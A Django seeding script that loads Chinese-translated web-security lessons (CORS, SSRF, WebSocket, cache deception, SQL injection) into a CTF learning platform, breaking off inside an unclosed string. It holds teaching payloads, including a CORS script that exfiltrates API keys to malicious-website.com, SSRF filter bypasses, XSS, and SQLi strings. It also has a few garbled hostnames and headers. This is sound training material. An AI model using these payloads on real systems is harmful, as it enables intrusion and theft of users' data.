"""
更新学习路径模块内容
从Markdown文件读取并翻译为中文
"""
import os
import django

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ctf_platform.settings')
django.setup()

from learning_paths.models import PathModule

# CORS 路径模块内容更新
cors_module1_content = """# 什么是CORS（跨域资源共享）？

跨域资源共享（CORS）是一种浏览器机制，允许受控地访问位于给定域之外的资源。它扩展并增加了对同源策略（SOP）的灵活性。然而，如果网站的CORS策略配置和实施不当，它也可能带来跨域攻击的潜在风险。CORS不是对跨站请求伪造（CSRF）等跨源攻击的保护。

## 同源策略（SOP）

同源策略是一种限制性的跨源规范，限制了网站与源域之外资源交互的能力。同源策略多年前就被定义出来，以应对可能恶意的跨域交互，例如一个网站窃取另一个网站的私人数据。它通常允许域向其他域发出请求，但不能访问响应。

## 同源策略的放宽

同源策略非常严格，因此设计了各种方法来绕过其约束。许多网站以需要完全跨域访问的方式与子域或第三方网站交互。可以使用跨域资源共享（CORS）来实现对同源策略的受控放宽。

跨域资源共享协议使用一套HTTP头来定义可信的Web源以及相关属性，例如是否允许经过身份验证的访问。这些在浏览器与其尝试访问的跨域网站之间的头交换中结合使用。
"""

cors_module2_content = """# CORS配置问题导致的漏洞

许多现代网站使用CORS来允许从子域和受信任的第三方访问。它们的CORS实现可能包含错误或过于宽松，以确保一切正常工作，这可能导致可利用的漏洞。

## 从客户端指定的Origin头生成的ACAO头

有些应用程序需要提供对许多其他域的访问。维护允许域列表需要持续的努力，任何错误都有可能破坏功能。因此，一些应用程序采取简单的方法，实际上允许从任何其他域访问。

一种方法是读取请求中的Origin头，并在响应头中包含声明允许请求源的信息。例如，考虑一个接收到以下请求的应用程序：

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然后它响应：

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-ssrfwebsite.com
Access-Control-Allow-Credentials: true
...
```

这些头声明允许从请求域（`malicious-website.com`）访问，并且跨源请求可以包含cookie（`Access-Control-Allow-Credentials: true`），因此将在会话中处理。

由于应用程序在`Access-Control-Allow-Origin`头中反射任意源，这意味着绝对任何域都可以从易受攻击域访问资源。如果响应包含任何敏感信息，如API密钥或CSRF令牌，可以通过在网站上放置以下脚本来检索它：

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

## 错误解析Origin头

一些支持从多个源访问的应用程序通过使用允许源的白名单来实现。当接收到CORS请求时，提供的源将与白名单进行比较。如果源出现在白名单中，则在`Access-Control-Allow-Origin`头中反射该源，从而授予访问权限。

实施CORS源白名单时经常会出现错误。一些组织决定允许从其所有子域（包括尚不存在的未来子域）访问。一些应用程序允许从各种其他组织的域及其子域访问。这些规则通常通过匹配URL前缀或后缀，或使用正则表达式来实现。实施中的任何错误都可能导致向意外的外部域授予访问权限。

例如，假设一个应用程序授予对以以下结尾的所有域的访问权限：

```
normal-website.com
```

攻击者可能能够通过注册以下域来获得访问权限：

```
hackersnormal-website.com
```

或者，假设一个应用程序授予对以以下开头的所有域的访问权限

```
normal-website.com
```

攻击者可能能够使用以下域获得访问权限：

```
normal-website.com.evil-user.net
```

## 信任null源值

Origin头的规范支持值`null`。浏览器可能会在各种异常情况下在Origin头中发送值`null`：
- 跨源重定向
- 来自序列化数据的请求
- 使用`file:`协议的请求
- 沙盒化跨源请求
"""

cors_module3_content = """# CORS漏洞实践

## 实验室：具有基本源反射的CORS漏洞

这个网站有一个不安全的CORS配置，它信任所有源。

要解决此实验室，请构造一些使用CORS的JavaScript来检索管理员的API密钥，并将代码上传到漏洞利用服务器。当你成功提交管理员的API密钥时，实验室即解决。

你可以使用以下凭据登录到自己的账户：`wiener:peter`

### 解决步骤

1. 确保拦截已关闭，然后使用浏览器登录并访问你的账户页面。
2. 查看历史记录，并观察到你的密钥是通过AJAX请求从`/accountDetails`检索到的，并且响应包含`Access-Control-Allow-Credentials`头，表明它可能支持CORS。
3. 将请求发送到Burp Repeater，并使用添加的头重新提交：
   ```
   Origin: https://example.com
   ```
4. 观察到源在`Access-Control-Allow-Origin`头中反射。
5. 在浏览器中，转到漏洞利用服务器并输入以下HTML，将`YOUR-LAB-ID`替换为你的唯一实验室URL：
   ```html
   <script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
       req.withCredentials = true;
       req.send();
       
       function reqListener() {
           location='/log?key='+this.responseText;
       };
   </script>
   ```
6. 点击"查看漏洞利用"。观察到漏洞利用有效 - 你已经登录日志页面，你的API密钥在URL中。
7. 返回漏洞利用服务器，点击"向受害者交付漏洞利用"。
8. 点击"访问日志"，检索并提交受害者的API密钥以完成实验室。
"""

# SSRF 路径模块内容更新
ssrf_module1_content = """# 什么是SSRF？

服务端请求伪造是一种Web安全漏洞，允许攻击者导致服务端应用程序向非预期位置发出请求。

在典型的SSRF攻击中，攻击者可能导致服务器向组织基础设施内部服务发出连接。在其他情况下，他们可能能够强制服务器连接到任意外部系统。这可能泄露敏感数据，例如授权凭据。

## SSRF攻击的影响是什么？

成功的SSRF攻击通常会导致组织内的未经授权操作或数据访问。这可能是在易受攻击的应用程序中，或在其可以通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令执行。

导致与外部第三方系统连接的SSRF漏洞可能导致恶意的后续攻击。这些可能看起来源自托管易受攻击应用程序的组织。
"""

ssrf_module2_content = """# 针对服务器的SSRF攻击

在针对服务器的SSRF攻击中，攻击者导致应用程序通过其回环网络接口发回托管该应用程序的服务器的HTTP请求。这通常涉及提供主机名为`127.0.0.1`（指向回环适配器的保留IP地址）或`localhost`（同一适配器的常用名称）的URL。

例如，想象一个购物应用程序，让用户查看某个项目的特定商店中是否有库存。为了提供库存信息，应用程序必须查询各种后端REST API。它通过前端HTTP请求传递相关后端API端点的URL来执行此操作。当用户查看某个项目的库存状态时，他们的浏览器会发出以下请求：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

这导致服务器向指定的URL发出请求，检索库存状态，并将其返回给用户。

在这个例子中，攻击者可以修改请求以指定服务器的本地URL：

```
POST /product/stock HTTP/1.0
ContentType: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

服务器获取`/admin` URL的内容并将其返回给用户。

攻击者可以访问`/admin` URL，但管理功能通常只能由经过身份验证的用户访问。这意味着攻击者不会看到任何感兴趣的内容。但是，如果对`/admin` URL的请求来自本地机器，正常的访问控制将被绕过。应用程序授予对管理功能的完全访问权限，因为请求看起来来自受信任的位置。

## 为什么应用程序会这样做？

应用程序为什么会这样行为，并隐含地信任来自本地机器的请求？这可能由各种原因引起：

- 访问控制检查可能在应用程序服务器前面的不同组件中实现。当建立回服务器的连接时，检查被绕过。
- 出于灾难恢复的目的，应用程序可能允许管理访问而无需登录，对来自本地机器的任何用户。这为管理员提供了一种在丢失凭据时恢复系统的方法。这假设只有完全受信任的用户才会直接来自服务器。
- 管理界面可能在与主应用程序不同的端口号上侦听，并且可能无法被用户直接访问。

这种类型的信任关系，即来自本地机器的请求的处理方式与普通请求不同，通常使SSRF成为关键漏洞。
"""

ssrf_module3_content = """# 针对后端系统的SSRF攻击

在某些情况下，应用程序服务器能够与用户无法直接访问的后端系统交互。这些系统通常具有不可路由的私有IP地址。后端系统通常受网络拓扑保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与这些系统交互的人都可以无需身份验证即可访问。

在之前的示例中，想象在后端URL `https://192.168.0.68/admin` 处有一个管理界面。攻击者可以提交以下请求以利用SSRF漏洞，并访问管理界面：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

## 实验室：针对另一个后端系统的基本SSRF

这个实验室有一个库存检查功能，从内部系统获取数据。

要解决此实验室，请使用库存检查功能扫描内部`192.168.0.X`范围以查找端口`8080`上的管理界面，然后使用它删除用户`carlos`。

### 解决步骤

1. 访问某个产品，点击"检查库存"，在Burp Suite中拦截请求，并将其发送到Burp Intruder。
2. 将`stockApi`参数更改为`http://192.168.0.1:8080/admin`，然后突出显示IP地址的最后八位字节（数字`1`），然后点击"添加 §"。
3. 在"Payloads"侧面板中，将payload类型更改为"Numbers"，并在"From"、"To"和"Step"框中分别输入1、255和1。
4. 点击"Start attack"。
5. 点击"Status"列以按状态代码升序排序。你应该看到单个状态为`200`的条目，显示管理界面。
6. 点击此请求，将其发送到Burp Repeater，并将`stockApi`中的路径更改为：`/admin/delete?username=carlos`
"""

ssrf_module4_content = """# 绕过常见的SSRF防御

有时，应用程序包含SSRF行为，同时还包含旨在防止恶意利用的防御措施。通常，这些防御可以绕过。

## 基于黑名单的输入过滤器的SSRF

某些应用程序阻止包含`127.0.0.1`和`localhost`等主机名或`/admin`等敏感URL的输入。在这种情况下，你通常可以使用以下技术绕过过滤器：

- 使用`127.0.0.1`的替代IP表示形式，例如`2130706433`、`017700000001`或`127.1`。
- 注册你自己的解析为`127.0.0.1`的域名。你可以使用`spoofed.burpcollaborator.net`来实现这一点。
- 使用URL编码或大小写变化来混淆被阻止的字符串。
- 提供一个你控制的URL，该URL重定向到目标URL。尝试使用不同的重定向代码，以及目标URL的不同协议。例如，在重定向期间从`http:`切换到`https:`URL已显示绕过某些反SSRF过滤器。

## 基于白名单的输入过滤器的SSRF

某些应用程序只允许输入匹配、开始或包含受信任域的输入。在这些情况下，可能可以利用URL解析不一致来绕过过滤器。

## 带正则表达式过滤器的SSRF

有时应用程序使用正则表达式来验证输入。如果正则表达式有缺陷，攻击者可能能够绕过它。

例如，以下正则表达式旨在阻止对本地主机的访问：
```
^https?://(?!localhost|127\.0\.0\.1)[a-z0-9\-\.]+
```

这个正则表达式允许攻击者使用：
- `http://017700000001`（八进制表示）
- `http://[::]`（IPv6本地回环）
- `http://2130706433`（十进制表示）

## 使用重定向绕过SSRF

如果应用程序阻止对特定URL的请求，攻击者可以使用他们控制的URL来绕过限制，该URL重定向到被阻止的URL。
"""

# WebSocket 路径模块内容更新
websocket_module1_content = """# WebSocket基础

WebSocket在现代Web应用程序中被广泛使用。它们通过HTTP启动，并提供具有双向异步通信的长连接。

WebSocket用于各种目的，包括执行用户操作和传输敏感信息。实际上，任何可能与常规HTTP相关的Web安全漏洞都可能在与WebSocket通信相关的情况下出现。

## WebSocket如何工作

WebSocket通过初始HTTP握手启动。客户端发送带有特定头的HTTP请求：

```
GET /chat HTTP/1.1
Host: normal-website.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13
```

如果服务器接受升级为WebSocket，它会返回如下响应：

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: ...
```

握手完成后，连接将保持打开状态，客户端和服务器可以使用此连接交换双向消息。

## WebSocket消息格式

WebSocket消息使用特定的帧格式发送。每个消息可以拆分为多个帧，并且消息可以是文本或二进制。

## WebSocket安全注意事项

由于WebSocket用于各种敏感操作，它们可能容易受到各种攻击：

- 消息内容中的输入验证问题可能导致SQL注入、XSS等漏洞
- 消息处理中的权限问题可能导致权限提升
- 认证和授权漏洞可能导致未授权访问
- 速率限制绕过可能导致拒绝服务
"""

websocket_module2_content = """# 操作WebSocket流量

查找WebSocket安全漏洞通常涉及以应用程序不期望的方式操作它们。你可以使用Burp Suite来实现。

你可以使用Burp Suite来：

- 拦截和修改WebSocket消息
- 重放和生成新的WebSocket消息
- 操作WebSocket连接

## 拦截和修改WebSocket消息

你可以使用Burp Proxy来拦截和修改WebSocket消息，如下所示：

1. 打开Burp的浏览器。
2. 浏览到使用WebSocket的应用程序功能。你可以通过使用应用程序并查找在Burp Proxy中的WebSocket历史记录选项卡中出现的条目来确定正在使用WebSocket。
3. 在Burp Proxy的Intercept选项卡中，确保拦截已打开。
4. 当从浏览器或服务器发送WebSocket消息时，它将在Intercept选项卡中显示供你查看或修改。按Forward按钮转发消息。

## 重放和生成新的WebSocket消息

除了实时拦截和修改WebSocket消息外，你还可以重放单个消息并生成新消息。你可以使用Burp Repeater来完成此操作：

1. 在Burp Proxy中，在WebSocket历史中选择一条消息，或在Intercept选项卡中，从上下文菜单中选择"Send to Repeater"。
2. 在Burp Repeater中，你现在可以编辑选定的消息，并一遍又一遍地发送它。
3. 你可以输入新消息并以任一方向（客户端或服务器）发送。
4. 在Burp Repeater中的"History"面板中，你可以查看通过WebSocket连接传输的消息历史记录。这包括你在Burp Repeater中生成的消息，以及通过同一连接由浏览器或服务器生成的任何消息。
5. 如果你想编辑并重新发送历史面板中的任何消息，可以通过选择消息并从上下文菜单中选择"Edit and resend"来实现。

## 操作WebSocket连接

除了操作WebSocket消息外，有时还需要操作建立连接的WebSocket握手。

在以下各种情况下，可能需要操作WebSocket握手：

- 它可以让你达到更多攻击面
- 某些攻击可能导致连接断开，因此你需要建立新连接
- 原始握手请求中的令牌或其他数据可能过时需要更新

你可以使用Burp Repeater操作WebSocket握手：

1. 按照前面描述的方式将WebSocket消息发送到Burp Repeater。
2. 在Burp Repeater中，单击WebSocket URL旁边的铅笔图标。这将打开一个向导，允许你附加到已连接的WebSocket，克隆已连接的WebSocket，或重新连接到断开连接的WebSocket。
3. 如果你选择克隆已连接的WebSocket或重新连接到断开连接的WebSocket，则向导将显示WebSocket握手请求的完整详细信息，你可以根据需要在执行握手之前对其进行编辑。
4. 当你单击"Connect"时，Burp将尝试执行配置的握手并显示结果。如果成功建立了新的WebSocket连接，你可以使用它在Burp Repeater中发送新消息。
"""

websocket_module3_content = """# WebSocket常见漏洞

实际上，几乎任何Web安全漏洞都可能在与WebSocket相关的情况下出现：

- 传输到服务器的用户输入可能以不安全的方式处理，导致SQL注入或XML外部实体注入等漏洞。
- 通过WebSocket到达的某些盲漏洞可能只能使用带外（OAST）技术来检测。
- 如果攻击者控制的数据通过WebSocket传输给其他应用程序用户，则可能导致XSS或其他客户端漏洞。

## 操作WebSocket消息以利用漏洞

影响WebSocket的大多数基于输入的漏洞可以通过篡改WebSocket消息的内容来发现和利用。

例如，假设一个聊天应用程序使用WebSocket在浏览器和服务器之间发送聊天消息。当用户输入聊天消息时，向服务器发送如下WebSocket消息：

```
{"message":"Hello Carlos"}
```

消息内容（再次通过WebSocket）传输给另一个聊天用户，并在用户浏览器中呈现如下：

```
<td>Hello Carlos</td>
```

在这种情况下，如果没有其他输入处理或防御措施，攻击者可以通过提交以下WebSocket消息执行概念验证XSS攻击：

```
{"message":"<img src=1 onerror='alert(1)'>"}
```

## 实验室：操作WebSocket消息以利用漏洞

这个在线商店具有使用WebSocket实现的实时聊天功能。

你提交的聊天消息由支持代理实时查看。

要解决此实验室，请使用WebSocket消息在支持代理的浏览器中触发`alert()`弹出窗口。

### 解决步骤

1. 点击"Live chat"并发送聊天消息。
2. 在Burp Proxy中，转到WebSocket历史记录选项卡，并观察到聊天消息已通过WebSocket消息发送。
3. 使用浏览器，发送一条包含`<`字符的新消息。
4. 在Burp Proxy中，找到相应的WebSocket消息，并观察到`<`在发送前已被客户端HTML编码。
5. 确保配置Burp Proxy拦截WebSocket消息，然后发送另一条聊天消息。
6. 编辑拦截的消息以包含以下payload：
   ```
   <img src=1 onerror='alert(1)'>
   ```
7. 观察到在浏览器中触发了alert。这也将在支持代理的浏览器中发生。
"""

# Web缓存欺骗 路径模块内容更新
wcd_module1_content = """# Web缓存基础

Web缓存是位于源服务器和用户之间的系统。当客户端请求静态资源时，请求首先定向到缓存。如果缓存不包含资源的副本（称为缓存未命中），则请求将转发到源服务器，该服务器处理并响应请求。然后在将响应发送给用户之前将其发送到缓存。缓存使用一组预配置的规则来确定是否存储响应。

当将来对同一静态资源发出请求时，缓存直接向用户提供存储的响应副本（称为缓存命中）。

缓存已成为提供Web内容的一个常见且关键方面，特别是随着内容分发网络（CDN）的广泛使用，CDN使用缓存在世界各地的分布式服务器上存储内容副本。CDN通过从离用户最近的服务器提供内容来加快交付速度，通过最小化数据传输距离来减少加载时间。

## 缓存键

当缓存接收到HTTP请求时，它必须决定是否有可以直接提供的缓存响应，或者是否必须将请求转发到源服务器。缓存通过从HTTP请求的元素生成"缓存键"来做出此决定。通常，这包括URL路径和查询参数，但也可能包括各种其他元素，如头和内容类型。

如果传入请求的缓存键与先前请求的缓存键匹配，则缓存认为它们等效并提供缓存响应的副本。

## 缓存规则

缓存规则确定可以缓存什么以及缓存多长时间。缓存规则通常设置为存储静态资源，这些资源通常不经常更改并在多个页面中重用。不缓存动态内容，因为它更有可能包含敏感信息，确保用户直接从服务器获取最新数据。

Web缓存欺骗攻击利用缓存规则的应⽤⽅式，因此了解一些不同类型的规则很重要，特别是那些基于请求URL路径中定义的字符串的规则。例如：

- 静态文件扩展名规则 - 这些规则匹配所请求资源的文件扩展名，例如`.css`用于样式表或`.js`用于JavaScript文件。
- 静态目录规则 - 这些规则匹配所有以特定前缀开头的URL路径。这些通常用于仅包含静态资源的特定目录，例如`/static`或`assets`。
- 文件名规则 - 这些规则匹配特定文件名，以针对Web操作普遍需要且很少更改的文件，例如`robots.txt`和`favicon.ico`。

缓存还可以基于其他标准实施自定义规则，例如URL参数或动态分析。
"""

wcd_module2_content = """# 缓存规则详解

## 缓存规则类型

### 静态文件扩展名规则

这些规则匹配所请求资源的文件扩展名：
- `.css` - 样式表文件
- `.js` - JavaScript文件
- `.png`, `.jpg`, `.gif` - 图片文件
- `.svg` - 矢量图形文件
- `.woff`, `.ttf` - 字体文件

### 静态目录规则

这些规则匹配所有以特定前缀开头的URL路径：
- `/static/` - 静态资源目录
- `/assets/` - 资产目录
- `/css/` - 样式表目录
- `/js/` - JavaScript目录
- `/images/` - 图片目录

### 文件名规则

这些规则匹配特定文件名：
- `robots.txt` - 网站爬虫规则
- `favicon.ico` - 网站图标
- `sitemap.xml` - 网站地图

## 缓存控制头

`Cache-Control` HTTP头提供缓存指令：

- `public` - 响应可以被任何缓存存储
- `private` - 响应只能由浏览器缓存
- `no-cache` - 必须先验证缓存是否有效
- `no-store` - 不允许缓存响应
- `max-age=<seconds>` - 响应的最大缓存时间
- `must-revalidate` - 缓存过期后必须重新验证

## 检测缓存响应

在测试期间，能够识别缓存响应至关重要。为此，请查看响应头和响应时间。

各种响应头可能指示它已被缓存。例如：

- `X-Cache`头提供有关响应是否从缓存提供的信息。典型值包括：
  - `X-Cache: hit` - 响应从缓存提供。
  - `X-Cache: miss` - 缓存不包含请求密钥的响应，因此从源服务器获取。在大多数情况下，响应随后被缓存。要确认这一点，再次发送请求以查看值是否更新为hit。
  - `X-Cache: dynamic` - 源服务器动态生成内容。通常这意味着响应不适合缓存。
  - `X-Cache: refresh` - 缓存内容已过时，需要刷新或重新验证。
- `Cache-Control`头可能包含指示缓存的指令，例如`public`且`max-age`高于`0`。注意，这只是建议资源是可缓存的。它并不总是指示缓存，因为缓存有时可能会覆盖此头。

如果你注意到同一请求的响应时间有很大差异，这可能表明较快的响应来自缓存。
"""

wcd_module3_content = """# 构建Web缓存欺骗攻击

## 构建攻击步骤

通常，构建基本的Web缓存欺骗攻击涉及以下步骤：

1. **识别目标端点** - 识别返回包含敏感信息的动态响应的目标端点。在Burp中查看响应，因为某些敏感信息在渲染页面上可能不可见。专注于支持`GET`、`HEAD`或`OPTIONS`方法的端点，因为更改源服务器状态的请求通常不会被缓存。
2. **识别差异** - 识别缓存和源服务器解析URL路径方式的差异。这可能是它们在以下方面的差异：
   - 将URL映射到资源
   - 处理分隔符字符
   - 规范化路径
3. **制作恶意URL** - 使用差异制作恶意URL，欺骗缓存存储动态响应。当受害者访问URL时，他们的响应存储在缓存中。使用Burp，然后可以向同一URL发送请求以获取包含受害者数据的缓存响应。避免直接在浏览器中执行此操作，因为某些应用程序会在没有会话的情况下重定向用户或使本地数据无效，这可能会隐藏漏洞。

## 使用缓存破坏器

在测试差异和制作Web缓存欺骗漏洞利用时，确保你发送的每个请求都有不同的缓存键。否则，你可能会得到缓存的响应，这将影响你的测试结果。

由于URL路径和任何查询参数通常都包含在缓存键中，你可以通过向路径添加查询字符串并在每次发送请求时更改它来更改密钥。使用Param Miner扩展自动执行此过程。为此，一旦安装了扩展程序，单击顶层菜单**Param miner > Settings**，然后选择**Add dynamic cachebuster**。Burp现在向你的每个请求添加唯一的查询字符串。你可以在**Logger**选项卡中查看添加的查询字符串。

## 利用静态扩展名缓存规则

缓存规则通常通过匹配常见文件扩展名（如`.css`或`.js`）来针对静态资源。这是大多数CDN中的默认行为。

如果缓存和源服务器在将URL路径映射到资源或使用分隔符的方式上存在差异，攻击者可能能够制作请求静态扩展名的动态资源，该资源被源服务器忽略，但被缓存视为需要缓存。

## 路径映射差异

URL路径映射是将URL路径与服务器上的资源（如文件、脚本或命令执行）关联的过程。不同框架和技术使用了一系列不同的映射样式。两种常见样式是传统URL映射和RESTful URL映射。

传统URL映射表示直接指向位于文件系统中的资源的路径。这是一个典型示例：

```
http://example.com/path/in/filesystem/resource.html
```

- `http://example.com`指向服务器
- `/path/in/filesystem/`代表服务器文件系统中的目录路径
- `resource.html`是被访问的特定文件

相比之下，REST样式URL不直接匹配物理文件结构。它们将文件路径抽象为API的逻辑部分：

```
http://example.com/path/resource/param1/param2
```

- `http://example.com`指向服务器
- `/path/resource/`是表示资源的端点
- `param1`和`param2`是服务器用于处理请求的路径参数

## 路径映射差异示例

缓存和源服务器将URL路径映射到资源的方式的差异可能导致Web缓存欺骗漏洞。考虑以下示例：

```
http://example.com/user/123/profile/wcd.css
```

- 使用REST风格URL映射的源服务器可能将此解释为对`/user/123/profile`端点的请求，并返回用户`123`的个人资料信息，将`wcd.css`作为不重要的参数忽略。
- 使用传统URL映射的缓存可能将此视为对位于`/user/123`下`/profile`目录中名为`wcd.css`的文件的请求。它将URL路径解释为`/user/123/profile/wcd.css`。如果缓存配置为存储路径以`.css`结尾的请求的响应，它将缓存并像CSS文件一样提供个人资料信息。

## 实验室：利用路径映射进行Web缓存欺骗

要解决此实验室，请查找用户`carlos`的API密钥。你可以使用以下凭据登录到自己的账户：`wiener:peter`

### 解决步骤

1. **识别目标端点**
   - 在Burp的浏览器中，使用凭据`wiener:peter`登录到应用程序。
   - 注意到响应包含你的API密钥。

2. **识别路径映射差异**
   - 在`Proxy > HTTP history`中，右键单击`GET /my-account`请求并选择`Send to Repeater`。
   - 转到`Repeater`选项卡。向基本路径添加任意段，例如将路径更改为`/my-account/abc`。
   - 发送请求。注意到你仍然收到包含你的API密钥的响应。这表明源服务器将URL路径抽象为`/my-account`。
   - 向URL路径添加静态扩展名，例如`/my-account/abc.js`。
   - 发送请求。注意到响应包含`X-Cache: miss`和`Cache-Control: max-age=30`头。
   - 在30秒内重新发送请求。注意`X-Cache`头的值更改为`hit`。这表明它从缓存提供服务。由此，我们可以推断缓存将URL路径解释为`/my-account/abc.js`，并具有基于`.js`静态扩展名的缓存规则。你可以使用此payload进行漏洞利用。

3. **制作漏洞利用**
   - 在Burp的浏览器中，单击"转到漏洞利用服务器"。
   - 在`Body`部分，制作一个漏洞利用，引导受害者用户`carlos`到你之前制作的恶意URL。确保更改你添加的任意路径段，以便受害者不会收到你之前缓存的响应：
     ```html
     <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
     ```
   - 单击"向受害者交付漏洞利用"。当受害者查看漏洞利用时，他们收到的响应存储在缓存中。
   - 转到你在漏洞利用中传递给`carlos`的URL：
     ```
     https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
     ```
   - 注意到响应包含`carlos`的API密钥。复制它。
   - 单击"提交解决方案"，然后提交`carlos`的API密钥以解决实验室。
"""

# SQL注入 路径模块内容更新
sql_module1_content = """# 什么是SQL注入（SQLi）？

SQL注入（SQLi）是一种Web安全漏洞，它允许攻击者干扰应用程序对其数据库进行的查询。这允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，导致应用程序内容或行为的持久性更改。

在某些情况下，攻击者可以将SQL注入攻击升级为破坏底层服务器或其他后端基础设施。它还可以使他们执行拒绝服务攻击。

## SQL注入的影响

SQL注入漏洞的影响可能会因应用程序的性质以及数据库配置的不同而差异很大。SQL注入的一些潜在影响包括：

- 访问未经授权的数据
- 修改或删除数据
- 提升权限
- 在某些情况下，执行操作系统命令
- 拒绝服务攻击

## 常见的SQL注入场景

SQL注入可能出现在应用程序接受用户输入的任何位置：

- 搜索框
- 登录表单
- URL参数
- Cookie
- HTTP头

## 数据库基础

SQL（结构化查询语言）是一种用于管理关系数据库的标准语言。常见的SQL操作包括：

- `SELECT` - 从数据库检索数据
- `INSERT` - 向数据库插入新数据
- `UPDATE - 更新现有数据
- `DELETE` - 从数据库删除数据
- `CREATE` - 创建新表或数据库
- `DROP` - 删除表或数据库
"""

sql_module2_content = """# 检测SQL注入漏洞

## 手动检测方法

你可以使用针对应用程序中每个入口点的系统测试集手动检测SQL注入。为此，你通常会提交：

- 单引号`'`并查找错误或其他异常。
- 一些评估为入口点基本（原始）值和不同值的SQL特定语法，并查找应用程序响应中的系统差异。
- 布尔条件（如`OR 1=1`和`OR 1=2`），并查找应用程序响应中的差异。
- 在SQL查询中执行时设计为触发时间延迟的payload，并查找响应时间中的差异。
- 设计为在SQL查询中执行时触发带外网络交互（OAST）的payload，并监控任何由此产生的交互。

## 基于错误的SQL注入

在某些情况下，应用程序可能返回数据库错误消息。这些错误消息可能泄露有关数据库结构的有用信息。

示例：
```
' OR 1=1 --
```

这可能导致错误：
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
```

## 基于布尔的SQL注入

当应用程序根据查询结果返回不同的响应时，你可以使用布尔条件来测试SQL注入。

测试：
- `' OR 1=1 --` - 应该返回数据（True）
- `' OR 1=2 --` - 不应该返回数据（False）

## 基于时间的SQL注入

当应用程序没有可见的响应差异时，你可以使用时间延迟来检测SQL注入。

测试：
```sql
' OR SLEEP(5) --
' AND pg_sleep(5) -- -- PostgreSQL
```

## 基于联合的SQL注入

UNION运算符允许你组合两个或多个SELECT语句的结果。

示例：
```sql
' UNION SELECT username, password FROM users --
```

## 盲SQL注入

当应用程序不返回错误或数据，只有响应差异时，你可以使用盲SQL注入技术。

- 布尔盲注：使用条件判断数据
- 时间盲注：使用时间延迟确认数据存在
- 带外盲注：使用DNS或HTTP请求确认数据

## 使用工具

除了手动检测外，你还可以使用Burp Scanner快速可靠地发现大多数SQL注入漏洞。

其他常用工具包括：
- SQLMap
- sqlninja
- jSQL Injection
"""

sql_module3_content = """# 检索隐藏数据

## 场景示例

想象一个购物应用程序，显示不同类别的产品。当用户点击**Gifts**类别时，他们的浏览器请求URL：

```
https://insecure-website.com/products?category=Gifts
```

这导致应用程序向数据库进行SQL查询以检索相关产品的详细信息：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

此SQL查询要求数据库返回：
- 所有详细信息（`*`）
- 从`products`表
- 其中`category`是`Gifts`
- 并且`released`是`1`。

限制`released = 1`用于隐藏未发布的产品。我们可以假设对于未发布的产品，`released = 0`。

## 利用SQL注入

应用程序没有实施任何针对SQL注入攻击的防御。这意味着攻击者可以构造以下攻击，例如：

```
https://insecure-website.com/products?category=Gifts'--
```

这导致SQL查询：

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

关键是，注意`--`是SQL中的注释指示符。这意味着查询的其余部分被解释为注释，有效地删除了它。在此示例中，这意味着查询不再包含`AND released = 1`。结果，所有产品都会显示，包括尚未发布的产品。

你可以使用类似的攻击导致应用程序显示任何类别的所有产品，包括他们不知道的类别：

```
https://insecure-secure-website.com/products?category=Gifts'+OR+1=1--
```

这导致SQL查询：

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

修改后的查询返回所有项目，其中`category`是`Gifts`，或者`1`等于`1`。由于`1=1`总是为true，查询返回所有项目。

### 警告

将条件`OR 1=1`注入SQL查询时要小心。即使在你注入的上下文中看起来无害，但应用程序经常在多个不同的查询中使用来自单个请求的数据。如果您的条件到达`UPDATE`或`DELETE`语句，例如，它可能导致意外的数据丢失。

## 实验室：WHERE子句中的SQL注入漏洞允许检索隐藏数据

这个实验室在产品类别筛选器中包含SQL注入漏洞。当用户选择类别时，应用程序执行如下SQL查询：

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

要解决此实验室，请执行SQL注入攻击，导致应用程序显示一个或多个未发布的产品。

### 解决步骤

1. 使用Burp Suite拦截和修改设置产品类别筛选器的请求。
2. 将`category`参数的值修改为`'+OR+1=1--`。
3. 提交请求，并验证响应现在包含一个或多个未发布的产品。
"""

sql_module4_content = """# SQL注入在不同查询中的位置

大多数SQL注入漏洞发生在`SELECT`查询的`WHERE`子句中。大多数经验丰富的测试人员都熟悉这种类型的SQL注入。

然而，SQL注入漏洞可能出现在查询中的任何位置，以及不同的查询类型。SQL注入出现的一些其他常见位置：

- 在`UPDATE`语句中，在更新的值或`WHERE`子句中
- 在`INSERT`语句中，在插入的值中
- 在`SELECT`语句中，在表名或列名中
- 在`SELECT`语句中，在`ORDER BY`子句中

## UPDATE语句中的SQL注入

想象一个应用程序，允许用户更新其个人资料信息：

```sql
UPDATE users SET email = 'user@example.com' WHERE id = 1
```

如果`email`或`id`参数易受SQL注入攻击，攻击者可以：

```sql
-- 修改其他用户的电子邮件
UPDATE users SET email = 'attacker@evil.com' WHERE id = 1 OR 1=1 --

